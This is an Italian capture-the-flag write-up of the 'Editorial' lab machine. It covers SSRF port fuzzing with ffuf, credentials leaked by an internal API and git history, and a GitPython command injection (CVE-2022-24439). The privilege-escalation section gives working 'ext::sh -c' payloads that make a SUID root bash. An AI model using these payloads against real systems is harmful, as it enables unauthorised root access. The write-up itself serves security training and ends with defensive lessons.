+++
date = '2026-07-30T13:28:24+02:00'
draft = false
title = 'Editorial Writeup IT'
+++
**Autore**: **`joy.scd01`**

**Data**: **`17/02/2025`**

![Editorial.png](/images/imgs_editorial/Editorial.png)

---
# Introduzione

**_Editorial_** è una macchina **Linux di livello Easy** che mette in evidenza i rischi di una **Server-Side Request Forgery** (**SSRF**) e di una pessima gestione delle credenziali nei sistemi di versionamento del codice.

Il foothold iniziale si ottiene scoprendo una vulnerabilità **SSRF** in un form di upload per la pubblicazione di libri. Fuzzando le porte interne, ho scoperto un'**API** nascosta in esecuzione sulla porta **5000**, che ha leakato comunicazioni interne contenenti credenziali valide per un utente.
Il lateral movement avviene enumerando la history della repository locale **.git**, rivelando credenziali hardcoded per un altro utente. Infine, la Privilege Escalation sfrutta uno script **Python** in esecuzione con privilegi **sudo**. Lo script utilizza una versione vulnerabile di **GitPython** (**CVE-2022-24439**), che permette l'**esecuzione arbitraria di comandi**. Copiare e impostare il **SUID bit** su un binario **bash** garantisce l'accesso a **root**.

---
# Tecniche Utilizzate

- **Parameter Tampering**

- **Server-Side Request Forgery** (**SSRF**)

- **Fuzzing di API interne**

- **Command Injection su Python GitPython (CVE-2022-24439)**

---
# Enumerazione

## nmap

Scansione iniziale di tutte le porte:

```bash
nmap -p- editorial -T5
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Scansione mirata con script e rilevamento servizi:

```bash
nmap -sC -sV editorial -T5
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ho aggiunto **`editorial.htb`** al mio file **`/etc/hosts`**.

## Enumerazione Web 

Mentre **Gobuster** eseguiva l'enumerazione delle directory, ho esplorato manualmente il sito web sulla porta **80**.

```bash
gobuster dir -u http://editorial.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

![gob.png](/images/imgs_editorial/gob.png)

Ho trovato un endpoint interessante: **`/upload`**. Questa pagina conteneva un modulo per inserire informazioni su un libro. Due input in particolare hanno attirato la mia attenzione: un campo "**Cover URL**" e una funzionalità di **file upload** con un pulsante "**Preview**".

![form.png](/images/imgs_editorial/form.png)

Vedendo un form che accetta sia un URL fornito dall'utente sia l'upload di un file, ho subito sospettato due potenziali vulnerabilità:

- **Server-Side Request Forgery** (**SSRF**)

- **File Upload Vulnerability** (**RCE**)

Ho avviato **Burp Suite** e ho iniziato a intercettare le richieste per capire come il backend gestisse l'input del **Cover URL**.

---
# Accesso Iniziale | SSRF & API Leak

Per testare la presenza della **SSRF**, ho impostato un listener **Netcat** sulla mia macchina attaccante e ho inserito il mio indirizzo IP nel campo **Cover URL**.

```bash
nc -lvnp 22667
```

![ssrf_test.png](/images/imgs_editorial/ssrf_test.png)

Ho ricevuto una connessione. Analizzando la risposta **HTTP** su **Burp Suite**, il server ha restituito un percorso verso un'immagine placeholder: **`/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg`**.

![req_img.png](/images/imgs_editorial/req_img.png)

Ho inviato la richiesta al **Repeater** e ho modificato l'URL per enumerare le porte interne sul **localhost** (**`127.0.0.1:22`**, **`127.0.0.1:1234`**, ecc.). Il server continuava a restituire **`200 OK`** per tutte, segno che avevo bisogno di un approccio più sistematico per trovare un possibile servizio interno corretto.

Ho creato una wordlist contenente numeri (**da 0 a 9999**):

```bash
seq 0 9999 > paylist
```

Inizialmente ho provato a usare **Intruder** di **Burp Suite**, ma era incredibilmente lento. 

![intruder.png](/images/imgs_editorial/intruder.png)

Per velocizzare il processo, ho salvato la richiesta **HTTP** in un file chiamato **`ssrf.req`** e sono passato a **ffuf**:

**Nota**: _Non avendo mai usato questo tool per fuzzare un parametro in una richiesta, ho dovuto fare delle ricerche e studiarne il funzionamento._

```bash
ffuf -request ssrf.req -request-proto http -w paylist -fs 61
```

- **`-request ssrf.req`**: Dice a **ffuf** di utilizzare la richiesta **HTTP** salvata da **Burp Suite**. Ho sostituito il numero di porta nel file della richiesta con la parola **`FUZZ`** affinché **ffuf** sapesse dove iniettare i payload.

- **`-request-proto http`**: Forza il tool a utilizzare il protocollo **HTTP** per la richiesta.

- **`-w paylist`**: Specifica la wordlist contenente i numeri da **0 a 9999**.

- **`-fs 61`**: Filtra le risposte in base alla dimensione. In questo caso, una dimensione di **61** byte corrispondeva alla lunghezza di default restituita quando una porta chiusa caricava l'immagine placeholder. Filtrandola, **ffuf** mostra solo i risultati che restituiscono una risposta diversa.

![ffuf.png](/images/imgs_editorial/ffuf.png)

La scansione ha ottenuto un riscontro positivo sulla porta **5000**.
Sono tornato su **Burp Suite**, ho inserito nella richiesta **`127.0.0.1:5000`**, e il server ha restituito un file path differente: **`static/uploads/552c2438-3b86-4c78-8a60-e5a9e9a742e2`**.

![5000.png](/images/imgs_editorial/5000.png)

L'ho scaricato usando **curl** e passato in pipe a **jq** per una visualizzazione del **JSON** pulita:

```bash
curl -s http://editorial.htb/static/uploads/49c8c4dd-6821-4bf3-a409-6992e1d2a37e | jq .
```

Questo file ha leakato una serie di **API endpoints** interni.

![apis.png](/images/imgs_editorial/apis.png)

Ho subito targhettato l'endpoint **`authors`** tramite **Burp Suite**: 
- **`http://127.0.0.1:5000/api/latest/metadata/messages/authors`**.

La risposta conteneva un altro file path. L'ho scaricato e questo mostrava un messaggio di benvenuto con credenziali hardcoded:

![pass.png](/images/imgs_editorial/pass.png)

Ho utilizzato queste credenziali per accedere alla macchina via **SSH**:

```bash
ssh dev@editorial.htb
```

![userf.png](/images/imgs_editorial/userf.png)

Ho recuperato la **user flag** da **`/home/dev/user.txt`**.

---
# Lateral Movement | Git History

Una volta dentro, ho iniziato a enumerare il file system. Nella directory **`/apps`**, era presente una cartella nascosta **`.git`**.

```bash
cd apps
ls -lha
cd .git
```

![git.png](/images/imgs_editorial/git.png)

**Nota**: _Le repository **Git** lasciate sui server di produzione sono spesso miniere d'oro per **informazioni sensibili**._

Ho controllato la history dei commit usando **`git log`** e ho revisionato le modifiche commit per commit usando **`git show`**.  

In uno dei commit più vecchi, ho trovato una password hardcoded per l'utente **prod**:

![pass2.png](/images/imgs_editorial/pass2.png)

Sono passato all'utente **prod** utilizzando **`su prod`**.

---
# Privilege Escalation | CVE-2022-24439

Eseguendo **`sudo -l`** è emerso che l'utente **prod** poteva avviare uno specifico script **Python** come **root** senza password:

![sudol.png](/images/imgs_editorial/sudol.png)

Ho ispezionato lo script:

```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

**Nota**: _Lo script prende un argomento fornito dall'utente (**`sys.argv[1]`**), che si aspetta essere un **URL**, e lo passa alla funzione **`git.Repo.clone_from`**. La falla sta nell'inclusione del parametro **`multi_options=["-c protocol.ext.allow=always"]`**. Questa specifica configurazione abilita esplicitamente il protocollo di trasporto **`ext::`** di **Git**._  

Cercando "**python git repo exploit**", ho trovato la **CVE-2022-24439**. La libreria **GitPython** è vulnerabile ad una **Command Injection** quando risolve **URL** forniti dall'utente se il protocollo **`ext::`** è consentito. Un attaccante può creare un payload malevolo utilizzando **`ext::sh -c`** per eseguire comandi bash arbitrari nel contesto dello script (in questo caso, come **root**).  

Ho tentato di ottenere una reverse shell standard, ma il payload non veniva eseguito correttamente. Così ho optato per un approccio più affidabile: copiare il binario **bash** nella mia directory corrente, cambiarne il proprietario in **root** e impostare il **SUID bit**.

Dato che gli spazi nel payload avrebbero potuto rompere il parsing dell'**URL** di **Git**, ho usato **`%`** come separatore di spazio:

```bash
# 1. Primo payload: chown per far diventare root il proprietario del binario bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chown% root:root% /home/prod/bash'

# 2. Secondo payload: Imposto i permessi SUID
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chmod% 4755% /home/prod/bash'
```

![privesc1.png](/images/imgs_editorial/privesc1.png)

![privesc2.png](/images/imgs_editorial/privesc2.png)

A questo punto, l'ho semplicemente eseguito per spawnare una **root** shell:

```bash
./bash -p
```

![rootf.png](/images/imgs_editorial/rootf.png)

Ho recuperato la **root flag** da **`/root/root.txt`**.

---
# Considerazioni Finali

**_Editorial_** è una macchina **Easy**(**-NotSoEasy**) che mette in luce alcune delle misconfiguration più comuni e pericolose che si trovano nelle reali applicazioni web e nelle pipeline di deployment.

Il foothold iniziale tramite **SSRF** dimostra esattamente perché gli URL forniti dagli utenti debbano essere rigorosamente sanitizzati e perché le API interne non dovrebbero mai fidarsi del traffico locale. Bypassare il frontend e fuzzare la rete interna con **ffuf** è stato un ottimo esercizio di manipolazione manuale delle richieste.

La fase di lateral movement rappresenta uno scenario semplice, ma realistico. Lasciare un repository **`.git`** in un ambiente di produzione è un errore noto.

Infine, la fase di Privilege Escalation è stata lineare. Ha dimostrato che, anche se uno script custom può sembrare sicuro a prima vista, le librerie sottostanti su cui si basa possono introdurre falle. Sottolinea l'importanza critica di mantenere le dipendenze sempre aggiornate, specialmente per gli script eseguiti con i privilegi **sudo**.

**Fonti**:

- **Server-Side Request Forgery (SSRF) | https://portswigger.net/web-security/ssrf**

- **GitPython Command Injection (CVE-2022-24439) | https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858**